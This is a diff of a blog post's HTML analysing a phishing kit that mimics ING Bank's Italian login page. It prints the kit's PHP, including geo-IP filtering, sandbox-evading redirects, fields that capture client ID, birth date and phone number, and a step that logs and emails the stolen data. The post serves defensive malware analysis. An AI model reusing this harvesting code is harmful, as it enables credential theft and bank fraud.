-</span></span><span style="display:flex;"><span>$json <span style="color:#f92672">=</span> <span style="color:#a6e22e">url_get_contents</span>($url);
-</span></span><span style="display:flex;"><span>$json <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($json, <span style="color:#66d9ef">true</span>);
-</span></span><span style="display:flex;"><span>$country <span style="color:#f92672">=</span> $json[<span style="color:#e6db74">&#39;geoplugin_countryName&#39;</span>];
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># if($country == &#34;Italy&#34; || $country == &#34;United Kingdom&#34; || $country == &#34;Bulgaria&#34;)  {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>$ban_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;logs/banlist.txt&#34;</span>;
-</span></span><span style="display:flex;"><span>$list <span style="color:#f92672">=</span> <span style="color:#a6e22e">file</span>($ban_file, <span style="color:#a6e22e">FILE_IGNORE_NEW_LINES</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">FILE_SKIP_EMPTY_LINES</span>);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($ip, $list)) {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: https://www.google.com&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
-</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
-</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: login.php?&amp;sessionid=</span><span style="color:#e6db74">$hash</span><span style="color:#e6db74">&amp;securessl=true&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">die</span>();
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#}
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># }
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># else  {
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># header(&#39;Location: https://www.google.com&#39;);
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"># }
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hash</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$ip</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$url</span> <span class="o">=</span> <span class="s2">&#34;http://www.geoplugin.net/json.gp?ip=</span><span class="si">$ip</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">url_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_SSL_VERIFYPEER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_SSL_VERIFYHOST</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$json</span> <span class="o">=</span> <span class="nx">url_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$json</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$json</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$country</span> <span class="o">=</span> <span class="nv">$json</span><span class="p">[</span><span class="s1">&#39;geoplugin_countryName&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># if($country == &#34;Italy&#34;||$country == &#34;United Kingdom&#34; || $country == &#34;Bulgaria&#34;) {
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ban_file</span> <span class="o">=</span> <span class="s2">&#34;logs/banlist.txt&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$list</span> <span class="o">=</span> <span class="nx">file</span><span class="p">(</span><span class="nv">$ban_file</span><span class="p">,</span> <span class="nx">FILE_IGNORE_NEW_LINES</span> <span class="o">|</span> <span class="nx">FILE_SKIP_EMPTY_LINES</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$list</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: https://www.google.com&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;auth&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: login.php?&amp;sessionid=</span><span class="si">$hash</span><span class="s2">&amp;securessl=true&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#}
+</span></span></span><span class="line"><span class="cl"><span class="c1"># }
+</span></span></span><span class="line"><span class="cl"><span class="c1"># else  {
+</span></span></span><span class="line"><span class="cl"><span class="c1"># header(&#39;Location: https://www.google.com&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"># }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><p>Part of the code is commented out, indicating that the developer was testing different approaches.</p>
-<p>In the lines above, the kit uses <a href="https://geoplugin.net">geoplugin.net</a> to detect the country from which the victim is connecting by using the IP address; this technique is quite common for phishing kits. We can see from the comments, that the actor was probably targeting victims from Italy, UK and Bulgaria.</p>
-<p>The code is then referring to a file called <code>banlist.txt</code>, which should contains a list of IP addresses to be blocked. If the IP of the visitor of the page is in this list, the page will redirect to Google. <code>banlist.txt</code> is not in the zip file, but we can assume it contains a list of IP addresses of known sandboxes, just like it was done for the <a href="https://www.andpalmier.com/posts/phishing-findings-2/">LinkedIn kit analyzed in a previous post</a>.</p>
+<p>In the lines above, the kit uses <a href="https://geoplugin.net" target="_blank" rel="noopener">geoplugin.net</a> to detect the country from which the victim is connecting by using the IP address; this technique is quite common for phishing kits. We can see from the comments, that the actor was probably targeting victims from Italy, UK and Bulgaria.</p>
+<p>The code is then referring to a file called <code>banlist.txt</code>, which should contains a list of IP addresses to be blocked. If the IP of the visitor of the page is in this list, the page will redirect to Google. <code>banlist.txt</code> is not in the zip file, but we can assume it contains a list of IP addresses of known sandboxes, just like it was done for the <a href="https://www.andpalmier.com/posts/phishing-findings-2/" target="_blank" rel="noopener">LinkedIn kit analyzed in a previous post</a>.</p>
 <p>In case the IP address of the victim is not in <code>banlist.txt</code>, the visitor is redirected to <code>login.php</code> with a new session ID, obtained from the md5 hash of the IP address.</p>
-<figure><img src="/images/posts/phishing-findings/ep3/login.png"
-         alt="login.php"/><figcaption>
-            <p>login.php</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep3/login.png#center"
+         alt="login php of the kit"/> <figcaption>
+            <p>ING Bank kit: login.php</p>
         </figcaption>
 </figure>
 
 <p>The victim, by clicking on the link, is presented the page above, saying that the account of the visitor has been disabled temporarily for security reasons. If we click on the button, the message disappears, and we are now presented with a page asking for our client ID, birth date and phone number (you can see a screenshot of this page at the very beginning of this post).</p>
 <p>Interestingly, the page presents itself with a paragraph, on the left, where it says that <em>&ldquo;the codes entered will be doubly protected against phishing and spyware&rdquo;</em>, because after the visitor enters the login details, &ldquo;<em>it will be shown information which only ING can have&rdquo;</em>. Of course, this dialog is copied directly from the original ING login page for Italian customers, which you can see below:</p>
-<figure><img src="/images/posts/phishing-findings/ep3/realing.png"
-         alt="Real ING login page for Italian customers"/><figcaption>
-            <p>Real ING login page for Italian customers</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep3/realing.png#center"
+         alt="ING Bank login for Italian customers"/> <figcaption>
+            <p>Real ING Bankg login page for Italian customers</p>
         </figcaption>
 </figure>
 
 <p>Actually, a lot of the code of the page is copied directly from the original ING login page, but - of course - there are some small changes, especially in the forms.</p>
 <p>Here is the form from the original ING page:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetform&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./loginsso.aspx&#34;</span> <span style="color:#a6e22e">onsubmit</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">:return webform_onsubmit();&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetform&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vvc_form_enabled&#34;</span><span style="color:#f92672">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;aspnetform&#34;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;post&#34;</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&#34;./loginsso.aspx&#34;</span> <span class="nx">onsubmit</span><span class="o">=</span><span class="s2">&#34;javascript
+</span></span></span><span class="line"><span class="cl"><span class="s2">:return webform_onsubmit();&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;aspnetform&#34;</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;vvc_form_enabled&#34;</span><span class="o">&gt;</span>
 </span></span></code></pre></div><p>while this is the one of the kit:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetForm&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;pin.php?&amp;sessionid=&lt;?php echo </span><span style="color:#e6db74">$hash</span><span style="color:#e6db74">; ?&gt;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&amp;securessl=true&#34;</span> <span style="color:#a6e22e">onsubmit</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;javascript:return WebForm_OnSubmit();&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aspnetForm&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;vvc_form_enabled&#34;</span><span style="color:#f92672">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&#34;aspnetForm&#34;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&#34;post&#34;</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&#34;pin.php?&amp;sessionid=
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &lt;?php echo </span><span class="si">$hash</span><span class="s2">; ?&gt; &amp;securessl=true&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">onsubmit</span><span class="o">=</span><span class="s2">&#34;javascript:return WebForm_OnSubmit();&#34;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&#34;aspnetForm&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">class</span><span class="o">=</span><span class="s2">&#34;vvc_form_enabled&#34;</span><span class="o">&gt;</span>
 </span></span></code></pre></div><p>The <code>action</code> attribute is different and - again - we see a submission with the parameters <code>sessionid</code> and <code>securessl</code>, with the first still being the hash of the IP address of the visitor.
 The fields submitted to the form are:</p>
 <ul>
@@ -249,121 +286,125 @@ The fields submitted to the form are:</p>
 <li>Birth date, with input name <code>ctl00\$cphContenuto\$Login ContainerUC1\$LoginStepCifUC1\$txtgg</code></li>
 <li>Phone number, with input name <code>ctl00\$cphContenuto\$Login ContainerUC1\$LoginStepCifUC1\$txt</code></li>
 </ul>
-<h3 id="pinphp">pin.php</h3>
+<h3 id="pinphp">pin.php<a hidden class="anchor" aria-hidden="true" href="#pinphp">#</a></h3>
 <p>Let&rsquo;s see how they are used in <code>pin.php</code>:</p>
-<figure><img src="/images/posts/phishing-findings/ep3/pin.png"
-         alt="pin.php"/><figcaption>
-            <p>pin.php</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep3/pin.png#center"
+         alt="PIN phishing of ING bank"/> <figcaption>
+            <p>ING Bank kit: pin.php</p>
         </figcaption>
 </figure>
 
 <p>This page is asking for an OTP code that the victim should have received via SMS. This means that the actor is - either manually or with an automated agent - performing the login access to ING Bank with the credentials of the victim while the victim is still on the phishing page: otherwise the OTP code would expire and not useful for signing in. If the mechanics seems a bit confusing, don&rsquo;t worry, I will make a summary of the details of the process before the conclusion of this post!</p>
 <p>For now, let&rsquo;s focus on the code, here is the beginning of the PHP for <code>pin.php</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_SESSION[<span style="color:#e6db74">&#39;auth&#39;</span>])) {
-</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Location: http://www.google.com&#34;</span>);
-</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">die</span>();
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>$v_ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
-</span></span><span style="display:flex;"><span>$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($v_ip);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;auth&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">   <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Location: http://www.google.com&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">   <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$v_ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$hash</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$v_ip</span><span class="p">);</span>
 </span></span></code></pre></div><p>In the code above, the page is - once again - redirecting visitors which do not have the <code>auth</code> parameter to Google, to avoid detection.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    $codclient <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&#39;</span>];
-</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;codclient&#39;</span>] <span style="color:#f92672">=</span> $codclient;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    $giorno <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&#39;</span>];
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    $mese <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&#39;</span>];
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    $anno <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&#39;</span>];
-</span></span><span style="display:flex;"><span>}
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$codclient</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;codclient&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$codclient</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$giorno</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$mese</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$anno</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></div><p>This section is taking the parameters sent from <code>login.php</code> and assigning them to variables with Italian names, so far we have assigned data for the customer ID, the day, the month and the year of the specified birth date.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&#39;</span>])) {
-</span></span><span style="display:flex;"><span>    $telefono <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt&#39;</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#34;includes/my_email.php&#34;</span>;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">date_default_timezone_set</span>(<span style="color:#e6db74">&#39;Europe/London&#39;</span>);
-</span></span><span style="display:flex;"><span>    $ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
-</span></span><span style="display:flex;"><span>    $time <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#34;m-d-Y g:i:a&#34;</span>);
-</span></span><span style="display:flex;"><span>    $agent <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;HTTP_USER_AGENT&#39;</span>];
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ Dati Login per </span><span style="color:#e6db74">$username\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| codcliente: &#34;</span><span style="color:#f92672">.</span>$codclient<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| giorno: &#34;</span><span style="color:#f92672">.</span>$giorno<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| mese: &#34;</span><span style="color:#f92672">.</span>$mese<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| anno: &#34;</span><span style="color:#f92672">.</span>$anno<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $msg <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;| telefono: &#34;</span><span style="color:#f92672">.</span>$telefono<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $footer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $footer <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ Sent from </span><span style="color:#e6db74">$v_ip</span><span style="color:#e6db74"> on </span><span style="color:#e6db74">$time</span><span style="color:#e6db74"> via </span><span style="color:#e6db74">$agent\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $footer <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;+ ------------------------------------------+</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> $msg <span style="color:#f92672">.</span> $footer;
-</span></span><span style="display:flex;"><span>    $_SESSION[<span style="color:#e6db74">&#39;login_info&#39;</span>] <span style="color:#f92672">=</span> $msg;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    $fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;*********&#34;</span>, <span style="color:#e6db74">&#34;a&#34;</span>); <span style="color:#75715e">// HIDING LOG FILE
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">fputs</span>($fp,$data);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fclose</span>($fp);
-</span></span><span style="display:flex;"><span>    $subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Poste Login Info for User: </span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>    $headers <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;From: Poste Login Info &lt;</span><span style="color:#e6db74">$my_email</span><span style="color:#e6db74">&gt;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
